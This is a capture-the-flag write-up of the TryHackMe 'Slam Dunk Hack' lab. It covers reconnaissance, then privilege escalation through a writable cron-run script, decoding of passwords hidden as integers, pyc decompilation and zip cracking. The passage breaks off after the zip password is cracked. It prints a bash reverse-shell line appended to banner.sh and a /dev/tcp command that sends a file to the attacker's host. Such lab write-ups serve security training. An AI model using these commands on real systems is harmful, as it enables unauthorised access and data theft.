---
render_with_liquid: false
title: Slam Dunk Hack
date: 2023-08-15 16:27:49 +1400
tags: [tryhackme, nmap, linux, feroxbuster, enum, bash-script, scheduled-job-abuse, python, discover-history, discover-secrets, forensics-timestamp, crypto, pyc, pyinstaller-extractor, decompilation, python-script, zip2john, john, sudo]
---




# Recon
---

## Scripts

- 5 ports

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ tcpall 10.10.247.184
[+] Running command: sudo nmap -p- --min-rate 10000 -Pn -vv -oA ./nmap/all_tcp_ports --open 10.10.247.184
...
PORT     STATE SERVICE  REASON
21/tcp   open  ftp      syn-ack ttl 63
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
9025/tcp open  swa-3    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.45 seconds
           Raw packets sent: 87618 (3.855MB) | Rcvd: 68251 (2.730MB)
```

- Only 1 web service from **httpx**

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ webprobe 10.10.247.184|chttpx
http://10.10.247.184 [200] [NBA Website] [Apache/2.4.29 (Ubuntu)] [Apache HTTP Server:2.4.29,Ubuntu] [6d2c58d014ca97c8227e55b2ad1af6d4d59c9b2c]
```

- Assuming a firewall was configured, those ports did not response properly

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ bulknc 10.10.247.184
[+] Open Ports: 21,22,80,8000,9025
[+] Web Ports: 8000 80 443
[+] Non-Web Ports: 21 22 9025
[+] rlwrap nc 10.10.247.184 21 -v
a
a

[+] rlwrap nc 10.10.247.184 22 -v
a
a
AA

[+] rlwrap nc 10.10.247.184 9025 -v
AA
```

## Nmap

```bash

# Nmap 7.94 scan initiated Tue Aug 15 16:27:49 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 21,22,80,8000,9025 10.10.247.184
Nmap scan report for 10.10.247.184
Host is up, received user-set (0.28s latency).
Scanned at 2023-08-15 16:27:49 CST for 195s

PORT     STATE SERVICE  REASON         VERSION
21/tcp   open  ftp      syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 0f:43:fd:7b:0e:40:ec:02:0d:2b:d1:e3:fb:41:69:b6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCfb6V9y2ECnMmww0LnwyV9JUXQm9lMgcAEHxh5AZGqavZ73+F/PXxHVuG9Wj1bXg1EiO9JO4ZE6Iu6eXj4KN2naCWSeY7UZP4EmS7iRl8iwuaY4VeE2RhnRM1m7VXdGA+TfJnH8S/4sUaKUiRVxwYbqB9YYqray7v0mbSwE7YuW4vt0U2Nqe2cg0xvh01e4ABIDZpdB6t/gtVzTpgfv1L2Hve/fBx0uo0vkU1mGQ8aTiWcm2JJXgyD9Huzh5kN0w1hEkqlbwImJbAANu+T6R4m+h37AZtxELvZ5SBJ+7tE55aA9qbj0SKCX4SSVk2sqk6hHCA/APW8hAzxlKBBc7M1
|   256 3e:f8:c4:6b:e9:1d:34:25:d1:35:d6:64:88:e3:8d:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFj1xKfL+HsdDF2Vk2FCBc5H00WSKI0IgOsghIHXKA62+8HQV/O07yd/3hIPxaOcNzF0UDA8OD6PGaQhnxmKK2Q=
|   256 01:0d:24:56:18:8b:35:f0:64:58:02:65:29:54:43:af (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIqtSZ2cHZ4Y9uZskh04vf3bmIBDaaqraPg1Yh2MfRDv
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: NBA Website
8000/tcp open  ssl/http syn-ack ttl 63 Ajenti http control panel
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ajenti/organizationName=ubuntu-bionic/countryName=NA
| Issuer: commonName=ajenti/organizationName=ubuntu-bionic/countryName=NA
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-07T07:25:44
| Not valid after:  2033-08-04T07:25:44
| MD5:   b2b4:a87f:dc79:57c1:758a:55be:a01d:04ee
| SHA-1: 8577:4a46:0016:2b35:dc25:2ac7:bf12:2c44:fc9c:85ff
| -----BEGIN CERTIFICATE-----
| MIIE8zCCAtsCFHIG0BvDhwFDxf1gSkJhFz+SjzxIMA0GCSqGSIb3DQEBCwUAMDYx
...
| lxDx0MeUe6JEs1V0vpmDRVVFcZgLywzDgtu5k9eEALLT2xmChO9sOINbA5u1yq4k
| 2KAQNsTDoTTFcDwOwHv8amswDgOYDnw=
|_-----END CERTIFICATE-----
9025/tcp open  swa-3?   syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, LANDesk-RC, LPDString, NotesRPC, RTSPRequest, SIPOptions, X11Probe, afp, giop:
|     Username: Password:
|   Kerberos, LDAPBindReq, LDAPSearchReq, NCP, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, ms-sql-s, oracle-tns:
|_    Username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9025-TCP:V=7.94%I=7%D=8/15%Time=64DB370B%P=x86_64-pc-linux-gnu%r(NU
...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Tue Aug 15 16:31:04 2023 -- 1 IP address (1 host up) scanned in 195.64 seconds
```

## 80 - NBA Website

![](/assets/obsidian/44a9f8acece62f6fa8561ecab8be0d85.png)

### Directories

```bash
feroxbuster -u http://10.10.247.184/ -t 150 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```

```bash
301      GET        9l       28w      315c http://10.10.247.184/assets => http://10.10.247.184/assets/
200      GET       40l      197w     1347c http://10.10.247.184/script.js
200      GET      114l      208w     1633c http://10.10.247.184/styles.css
200      GET       81l      184w     2563c http://10.10.247.184/
200      GET      293l      643w     6892c http://10.10.247.184/assets/js/main.js
200      GET        1l        2w       15c http://10.10.247.184/note
200      GET        9l      155w     5417c http://10.10.247.184/assets/vendor/purecounter/purecounter_vanilla.js
200      GET      359l     1883w   179493c http://10.10.247.184/assets/img/features.jpg
[####################] - 2m     62326/62326   0s      found:8       errors:27
[####################] - 2m     62282/62282   507/s   http://10.10.247.184/
[####################] - 6s     62282/62282   9634/s  http://10.10.247.184/assets/ => Directory listing
[####################] - 6s     62282/62282   10489/s http://10.10.247.184/assets/vendor/ => Directory listing
[####################] - 1s     62282/62282   95232/s http://10.10.247.184/assets/js/ => Directory listing
[####################] - 11s    62282/62282   5666/s  http://10.10.247.184/assets/vendor/aos/ => Directory listing
[####################] - 7s     62282/62282   8551/s  http://10.10.247.184/assets/vendor/php-email-form/ => Directory listing
[####################] - 12s    62282/62282   5031/s  http://10.10.247.184/assets/vendor/bootstrap/ => Directory listing
[####################] - 7s     62282/62282   8553/s  http://10.10.247.184/assets/vendor/glightbox/ => Directory listing
[####################] - 7s     62282/62282   8551/s  http://10.10.247.184/assets/vendor/swiper/ => Directory listing
[####################] - 6s     62282/62282   11084/s http://10.10.247.184/assets/vendor/purecounter/ => Directory listing
[####################] - 7s     62282/62282   8551/s  http://10.10.247.184/assets/img/ => Directory listing
[####################] - 7s     62282/62282   8552/s  http://10.10.247.184/assets/vendor/isotope-layout/ => Directory listing 
```


# Exploit
---

## Enumeration


#### Bulk Dirb

I ran **feroxbuster** with `common.txt` wordlist first

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ bulkdirb 10.10.247.184
[+] Open Ports: 21,22,80,8000,9025
[+] Web Ports: 8000 80 443
[+] cat httpx/urls.txt | feroxbuster --stdin -n -w /usr/share/seclists/Discovery/Web-Content/common.txt -C 404 --dont-extract-links --smart

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.247.184
 🎯  Target Url            │ https://10.10.247.184:8000
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏦  Collect Backups       │ true
 🤑  Collect Words         │ true
 🏁  HTTP methods          │ [GET]
 🎶  Auto Tune             │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
Could not connect to https://10.10.247.184:8000 due to SSL errors (run with -k to ignore), skipping...
  => error sending request for url (https://10.10.247.184:8000/): error trying to connect: error:1416F086:SSL routines:tls_process_server_certificate:certificate verify failed:ssl/statem/statem_clnt.c:1919: (self signed certificate)[####################] - 0s         0/0       0s
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       81l      184w     2563c http://10.10.247.184/
301      GET        9l       28w      315c http://10.10.247.184/assets => http://10.10.247.184/assets/
200      GET       81l      184w     2563c http://10.10.247.184/index.html
200      GET        1l        2w       15c http://10.10.247.184/note
200      GET        6l       16w      147c http://10.10.247.184/robots.txt
```

> Robots.txt

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ curl 10.10.255.126/robots.txt

==================
| -------------- |         PHP Files:
| Slam Dunk Hack |                     php.php
| -------------- |
==================
```

> php.php

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ http 10.10.255.126/php.php
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Length: 1
Content-Type: text/html; charset=UTF-8
Date: Tue, 15 Aug 2023 10:25:35 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.29 (Ubuntu)
```

> Wait for box creator to fix it
{: .prompt-danger }


#### Port 8000 - Ajenti 2.2.5

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ http https://10.10.247.184:8000 --verify no
HTTP/1.1 302 Found
Content-Length: 0
Date: Tue, 15 Aug 2023 08:24:01 GMT
Location: /view/login/normal
X-Auth-Identity:
X-Worker-Name: restricted session
```

Got `ajenti`'s version : `2.2.5`

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ http https://10.10.247.184:8000/view/login/normal --verify no
HTTP/1.1 200 OK
Content-Length: 11018
Content-Type: text/html
Date: Tue, 15 Aug 2023 08:24:14 GMT
X-Auth-Identity:
X-Worker-Name: restricted session

<!DOCTYPE html>
<html ng:controller="CoreRootController">
    <head>
        <title ng:bind="pageTitle + (pageTitle ? ' | ' : '') + identity.machine.name"></title>
...

        <script>
            angular.module('core').constant('urlPrefix', '');
            angular.module('core').constant('ajentiPlugins', {"core": "Core", "plugins": "Plugins", "dashboard": "Dashboard", "services": "Services", "passwd": "User DB API", "ace": "Ace editor", "filesystem": "Filesystem API", "notepad": "Notepad", "filemanager": "File Manager", "settings": "Settings", "terminal": "Terminal", "packages": "Packages"});
            angular.module('core').constant('initialConfigContent', {"color": "default", "language": "en", "name": "ubuntu-bionic", "session_max_time": 3600});
            angular.module('core').constant('ajentiPlatform', 'debian');
            angular.module('core').constant('ajentiPlatformUnmapped', 'ubuntu');
            angular.module('core').constant('ajentiVersion', '2.2.5');
            angular.module('core').constant('devMode', 'False');
            angular.module('core').constant('pwReset', 'False');
            angular.module('core').constant('ajentiBootstrapColor', 'default');

            angular.element(document).ready(ajentiBootstrap);
        </script>
    </body>
</html>
```

> Did not found any RCE exploits for version : `2.2.5`
{: .prompt-tip }

## Reverse Shell as steph

> Wait for box creator to fix it
{: .prompt-danger }, currently using creds provided by him

```bash
sshpass -p 'i_Am_th3_b3St_Sh00t3r' ssh -o "StrictHostKeyChecking no" steph@10.10.247.184 
```

> Note that there's an abnormal group : `executable`

```bash
steph@ubuntu-bionic:~$ id
uid=1002(steph) gid=1002(steph) groups=1002(steph),1006(executable)
```

## From steph to kyrie


### Gather basic info in /home

User `steph`,`kyrie` is in the `executable` group

```bash
steph@ubuntu-bionic:~$ cat /etc/group
...
executable:x:1006:steph,kyrie
ftp:x:118:
ftpuser:x:1007:
```

There are 4 normal users: `steph`, `kyrie`, `lebron`, `jordan`

> Note that `ftpuser` have shell access

```bash
steph@ubuntu-bionic:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
steph:x:1002:1002:steph,,,:/home/steph:/bin/bash
kyrie:x:1003:1003:k,,,:/home/kyrie:/bin/bash
lebron:x:1004:1004:s,s,s,s,s:/home/lebron:/bin/bash
jordan:x:1005:1005:s,s,s,s,s:/home/jordan:/bin/bash
ftpuser:x:1006:1007:ftp,,,:/home/ftpuser:/bin/bash
```

Check files in home dir

```bash
steph@ubuntu-bionic:~$ ls -la
total 68
drwx------ 10 steph steph 4096 Aug 15 09:08 .
drwxr-xr-x  8 root  root  4096 Aug  7 08:12 ..
-rw-------  1 steph steph 2512 Aug 10 06:35 .bash_history
-rw-r--r--  1 steph steph  220 Aug  2 05:54 .bash_logout
-rw-r--r--  1 steph steph 3771 Aug  2 05:54 .bashrc
drwx------  4 steph steph 4096 Aug  5 16:06 .cache
drwx------  3 steph steph 4096 Aug  2 07:46 .gnupg
drwxr-xr-x  3 steph steph 4096 Aug  5 16:06 .groovy
drwxr-xr-x  3 steph steph 4096 Aug  5 16:06 .java
drwxrwxr-x  3 steph steph 4096 Aug  2 08:51 .local
-rw-r--r--  1 steph steph  807 Aug  2 05:54 .profile
-rw-------  1 steph steph  521 Aug 10 06:22 .python_history
drwx------  2 steph steph 4096 Aug  2 07:44 .ssh
drwxr-xr-x  2   700 steph 4096 Aug  7 05:40 .steph
-rw-------  1 steph steph  881 Aug 15 09:08 .viminfo
drwxrwxr-x  3 steph steph 4096 Aug  3 08:15 .wp-cli
-rw-rw-r--  1 steph steph  204 Aug  7 05:39 note.txt
```

`.python_history` contains a password which is related to `Lebron`

```
steph@ubuntu-bionic:~$ cat .python_history
from Crypto.Util.number import long_to_bytes
long_to_bytes(6817303833669520167833429600607861167711027)
exit()
from Crypto.Util.number import long_to_bytes
long_to_bytes(681730383366952016783342960060786116771102)
bytes_to_long(b"From Admin\nTo Lebron\nHere is your recovered password: SlVTVF9USEVfRzBBVEAxMjMK \n Becareful with it")
from Crypto.Util.number import long_to_bytes, bytes_to_long
bytes_to_long(b"From Admin\nTo Lebron\nHere is your recovered password: SlVTVF9USEVfRzBBVEAxMjMK \n Becareful with it")
exit()
```

There's a note from `Admin` to `Steph`

```bash
steph@ubuntu-bionic:~$ cat ~/note.txt

From: Admin
To: Steph Curry

* Hey Steph, our NBA dev team made a cool banner for Kyrie's machine you want one for yourself?
* You just need to explore the machine and you'll find the banner of Kyrie!
```

### Explore /opt

Check what files and folders the group : `executor` owns

```bash
steph@ubuntu-bionic:~$ find / -group executable 2>/dev/null
/opt/scripts/banner.sh
```

Check files in `/opt`

```bash
steph@ubuntu-bionic:~$ cd /opt
steph@ubuntu-bionic:/opt$ ls -la
total 24
drwxr-xr-x  5 root root 4096 Aug 10 05:01 .
drwxr-xr-x 25 root root 4096 Aug 15 07:49 ..
drwxr-xr-x  2 root root 4096 Aug  2 12:47 scripts
-rw-r--r--  1 root root 2524 Aug 10 05:01 server.py
drwxr-xr-x  2 root root 4096 Aug 10 06:25 services
drwxr-xr-x  2 root root 4096 Aug 10 06:07 tokens
```

```bash
steph@ubuntu-bionic:/opt$ cat server.py
import socket
import base64
import threading
import uuid


# Define the username and password
valid_username = "secureuser"
valid_password = "secretpass"


# Dictionary to store user tokens
user_tokens = {}


# Path to the token file
token_file_path = "user_tokens.txt"


# Define the server's address and port
server_address = ('localhost', 8080)
...

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(server_address)
    server.listen(5)

    print(f"Listening on {server_address[0]}:{server_address[1]}")

    while True:
        client_socket, client_address = server.accept()
        print(f"Accepted connection from {client_address[0]}:{client_address[1]}")

        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == "__main__":
    main()
```

Port `8080` is not opened on localhost though

```bash
steph@ubuntu-bionic:~$ ss -ltnp
State                      Recv-Q                      Send-Q                                              Local Address:Port                                             Peer Address:Port
LISTEN                     0                           80                                                      127.0.0.1:3306                                                  0.0.0.0:*
LISTEN                     0                           128                                                 127.0.0.53%lo:53                                                    0.0.0.0:*
LISTEN                     0                           128                                                       0.0.0.0:22                                                    0.0.0.0:*
LISTEN                     0                           10                                                        0.0.0.0:8000                                                  0.0.0.0:*
LISTEN                     0                           5                                                         0.0.0.0:9025                                                  0.0.0.0:*
LISTEN                     0                           128                                                             *:80                                                          *:*
LISTEN                     0                           32                                                              *:21                                                          *:*
LISTEN                     0                           128                                                          [::]:22                                                       [::]:*
```

Check `scripts` folder

```bash
steph@ubuntu-bionic:/opt$ cd scripts/
steph@ubuntu-bionic:/opt/scripts$ ls -la
total 12
drwxr-xr-x 2 root root       4096 Aug  2 12:47 .
drwxr-xr-x 5 root root       4096 Aug 10 05:01 ..
-rwxrwxr-x 1 root executable  634 Aug  3 11:49 banner.sh
```

```bash
steph@ubuntu-bionic:/opt/scripts$ cat banner.sh

#!/bin/bash

echo "============================================================"
echo "************************************************************"
echo "*              Welcome to Kyrie's Machine                  *"
echo "*                                                          *"
echo "*            Ayo I'm the best handler out there!           *"
echo "*      I'll break your handles / Don't mess with me XD     *"
echo "*                                                          *"
echo "************************************************************"
echo "============================================================"
```

So, users in `executor` group is able to edit the bash script, and the bash script runs as `kyrie` in cronjob

```bash
steph@ubuntu-bionic:/opt/scripts$ cat /etc/crontab
...
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   kyrie   bash /opt/scripts/banner.sh

#
```

### Shell as kyrie

```bash
steph@ubuntu-bionic:/opt/scripts$ echo 'bash -c "bash -i >& /dev/tcp/10.11.19.145/1111 0>&1"' >> banner.sh
```

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.11.19.145] from (UNKNOWN) [10.10.73.160] 43172
bash: cannot set terminal process group (3671): Inappropriate ioctl for device
bash: no job control in this shell

kyrie@ubuntu-bionic:~$ python3 -c 'import pty; pty.spawn("/bin/bash")' 
python3 -c 'import pty; pty.spawn("/bin/bash")'                                                                               
kyrie@ubuntu-bionic:~$ ^Z                                     
zsh: suspended  nc -lvnp 1111                    

┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]                   
└─$ stty raw -echo;fg                             
[1]  + continued  nc -lvnp 1111                           

kyrie@ubuntu-bionic:~$ export TERM=xterm
kyrie@ubuntu-bionic:~$ id
id
uid=1003(kyrie) gid=1003(kyrie) groups=1003(kyrie),1006(executable)
```


## From kyrie to jordan

Files owned by kyrie

```bash
kyrie@ubuntu-bionic:~$ find / -user kyrie 2>/dev/null|grep -vE '^/proc|^/run|^/sys|^/tmp'
<rie 2>/dev/null|grep -vE '^/proc|^/run|^/sys|^/tmp'
/home/kyrie
/home/kyrie/.bash_logout
/home/kyrie/.selected_editor
/home/kyrie/.profile
/home/kyrie/.local
/home/kyrie/.local/share
/home/kyrie/.local/share/nano
/home/kyrie/.bash_history
/home/kyrie/.bashrc
/home/kyrie/.cache
/home/kyrie/.cache/motd.legal-displayed
/home/kyrie/.gnupg
/home/kyrie/.gnupg/private-keys-v1.d
/home/kyrie/.python_history
kyrie@ubuntu-bionic:~$
```

```bash
kyrie@ubuntu-bionic:~$ ls -la
ls -la
total 56
...
-rwxr-xr-x 1   700 kyrie 8536 Aug  2 10:52 programz
```

### Jordan's creds stored in a python program

```bash
kyrie@ubuntu-bionic:~$ cat .python_history
cat .python_history
from Crypto.Util.number import long_to_bytes
long_to_bytes(61350852637343572750151018485361657327844636343148234636601969956187048150940171539959610016327763374740069045218192803664920281969537892)
exit()
```

Recover the password

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ ipython3
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.14.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: from Crypto.Util.number import long_to_bytes
   ...: long_to_bytes(61350852637343572750151018485361657327844636343148234636601969956187048150940171539959610016327763374740069045218192803664920281969537892)
Out[1]: b'The username for the python service is NbA_Pyth0n_Crack3d'
```

Find files and folders associated with `.python_history` around last modified timestamp

```bash
kyrie@ubuntu-bionic:~$ stat /home/kyrie/.python_history
stat /home/kyrie/.python_history
  File: /home/kyrie/.python_history
  Size: 205             Blocks: 8          IO Block: 4096   regular file
Device: ca01h/51713d    Inode: 264702      Links: 1
Access: (0600/-rw-------)  Uid: ( 1003/   kyrie)   Gid: ( 1003/   kyrie)
Access: 2023-08-02 11:13:49.454547065 +0000
Modify: 2023-08-02 11:13:49.454547065 +0000
Change: 2023-08-02 11:13:49.454547065 +0000
 Birth: -
```

```bash
kyrie@ubuntu-bionic:~$ find / -newermt '2023-08-02 10:13:49' ! -newermt '2023-08-02 12:13:49' -type f -readable -not -path "/proc/*" -not -path "/run/*" -not -path "/sys/*" -ls 2>/dev/null
< -path "/run/*" -not -path "/sys/*" -ls 2>/dev/null
    68789      4 -rw-r--r--   1 root     root          225 Aug  2 10:25 /etc/systemd/system/python.service
   268223     12 -rwxr-xr-x   1 700      kyrie        8536 Aug  2 10:52 /home/kyrie/programz
   264702      4 -rw-------   1 kyrie     kyrie         205 Aug  2 11:13 /home/kyrie/.python_history
   513097      4 -rwxr-xr-x   1 root      root         1958 Aug  2 10:25 /opt/services/script.pyc
```

The python service is running as root, and `/opt/services/script.pyc` is a `pycache` file

```bash
kyrie@ubuntu-bionic:~$ cat /etc/systemd/system/python.service
cat /etc/systemd/system/python.service
[Unit]
Description=My Python Script Service
After=network.target

[Service]
User=root
WorkingDirectory=/opt/services
ExecStart=/usr/bin/python3 /opt/services/script.pyc
Restart=always

[Install]
WantedBy=multi-user.target
```

Get some early insights about the `script.pyc`

```bash
kyrie@ubuntu-bionic:~$ strings /opt/services/script.pyc
strings /opt/services/script.pyc
rVe
bytes_to_long
long_to_bytesc
decode
print)
username
password
user
conn.py
verify_user
Username: i
Password: s
Authentication successful!
NBA - Official Secrets Department
lists
Secret 1
Secret 2
Secret 3
secret1s
Jordan
}MiKFu
}Jz57
9I_`P]
secret2s"
The refs support the Lakers only!
secret3s(
This is a good place for another secret
Error: s
Authentication failed!
...
```

Transfer the file to kali

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ mkdir loot && cd loot

┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ nc -lvnp 443 > script.pyc
```

```bash
kyrie@ubuntu-bionic:~$ cat /opt/services/script.pyc > /dev/tcp/10.11.19.145/443
<opt/services/script.pyc > /dev/tcp/10.11.19.145/443
```

Decompile it

> Switch to `python3.6` virtual environment to make `uncompyle6` working
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ source ~/venv-py3.8/bin/activate   

┌──(venv-py3.8)─(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ uncompyle6 -o . script.pyc
script.pyc --

# Successfully decompiled file
```

```bash
vi script.py
```

![](/assets/obsidian/18f3ccb990a95b2dcddb4d42e3cff151.png)

The string seems to be the creds of `jordan`, let's recover it

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ ipython3
Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0]
Type 'copyright', 'credits' or 'license' for more information
IPython 8.14.0 -- An enhanced Interactive Python. Type '?' for help.

In [1]: from Crypto.Util.number import long_to_bytes

In [2]: long_to_bytes(663292331045972032493591125118550990937733861458334814251888383055831805546600620404)
Out[2]: b'Wh0_Is_JAm3s_I_Am_Th3_All_Tim3_G0at'
```

### SSH as jordan

```bash
sshpass -p 'Wh0_Is_JAm3s_I_Am_Th3_All_Tim3_G0at' ssh -o "StrictHostKeyChecking no" jordan@10.10.73.160
```

```bash
jordan@ubuntu-bionic:~$ id
uid=1005(jordan) gid=1005(jordan) groups=1005(jordan)
```

### Rabbit Hole in binary : programz

```bash
kyrie@ubuntu-bionic:~$ file ./programz
./programz: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d74ccc144a2c56dad5a87d70801c116a48ae97a3, not stripped
```

```bash
kyrie@ubuntu-bionic:~$ ./programz
Enter Password:NbA_Pyth0n_Crack3d
Password is incorrect! Try GDB!
```

I retrieved the passwords from `strings`

```bash
kyrie@ubuntu-bionic:~$ ./programz
Enter Password:a
Password is incorrect! Try GDB!
kyrie@ubuntu-bionic:~$ strings ./programz
/lib64/ld-linux-x86-64.so.2
libc.so.6
...
[]A\A]A^A_
NjEzNTA4NTI2MzczNDM1NzI3NTAxNTEwMTg0ODUzNjE2NTczMjc4NDQ2MzYzNDMxNDgyMzQ2MzY2MDE5Njk5NTYxODcwNDgxNTA5NDAxNzE1Mzk5NTk2MTAwMTYzMjc3NjMzNzQ3NDAwNjkwNDUyMTgxOTI4MDM2NjQ5MjAyODE5Njk1Mzc4OTI=
Enter Password:
Password is incorrect! Try GDB!
;*3$"
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crtstuff.c
...
```

Base64 and hex decode the string

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ echo 'NjEzNTA4NTI2MzczNDM1NzI3NTAxNTEwMTg0ODUzNjE2NTczMjc4NDQ2MzYzNDMxNDgyMzQ2MzY2MDE5Njk5NTYxODcwNDgxNTA5NDAxNzE1Mzk5NTk2MTAwMTYzMjc3NjMzNzQ3NDAwNjkwNDUyMTgxOTI4MDM2NjQ5MjAyODE5Njk1Mzc4OTI='|base64 -d
61350852637343572750151018485361657327844636343148234636601969956187048150940171539959610016327763374740069045218192803664920281969537892    

┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln]
└─$ echo '61350852637343572750151018485361657327844636343148234636601969956187048150940171539959610016327763374740069045218192803664920281969537892'|xxd -r -p
aRcsCW'PHSaes'F641H#F6`iaPqSYa2wc7G@E!6d7                                                                                                    
```

> Tried the decoded password on some accounts and services, doesn't work
{: .prompt-danger }

## From jordan to root


### Method 1 -  creds in zip file


#### SSH as ftpuser

```bash
jordan@ubuntu-bionic:~$ find .
.
./.bash_logout
./...
./.../...
./.../Jordan.zip
./.profile
./.local
./.local/share
./.local/share/nano
./.bash_history
./.bashrc
./flag
./.cache
./.cache/motd.legal-displayed
./.gnupg
./.gnupg/private-keys-v1.d
```

```bash
jordan@ubuntu-bionic:~$ file ./.../Jordan.zip
./.../Jordan.zip: Zip archive data, at least v2.0 to extract

jordan@ubuntu-bionic:~$ unzip -l ./.../Jordan.zip
Archive:  ./.../Jordan.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       60  2023-08-07 05:56   note.txt
       23  2023-08-07 07:59   pass
---------                     -------
       83                     2 files
```

Copy it to kali

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ sshpass -p 'Wh0_Is_JAm3s_I_Am_Th3_All_Tim3_G0at' scp jordan@10.10.247.184:~/.../Jordan.zip .
```

Password is required, tried all previous gathered passwords but failed

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ unzip Jordan.zip
Archive:  Jordan.zip
[Jordan.zip] note.txt password:
```

Crack it with `rockyou.txt`

```bash
┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ zip2john Jordan.zip > Jordan.zip.hash
ver 2.0 efh 5455 efh 7875 Jordan.zip/note.txt PKZIP Encr: TS_chk, cmplen=68, decmplen=60, crc=7E036AFA ts=2F20 cs=2f20 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** Jordan.zip/pass PKZIP Encr: TS_chk, cmplen=35, decmplen=23, crc=A321CF0D ts=3F78 cs=3f78 type=0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

┌──(bravosec㉿fsociety)-[~/thm/dunkinvuln/loot]
└─$ john Jordan.zip.hash --wordlist=/opt/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tinkerbell       (Jordan.zip)
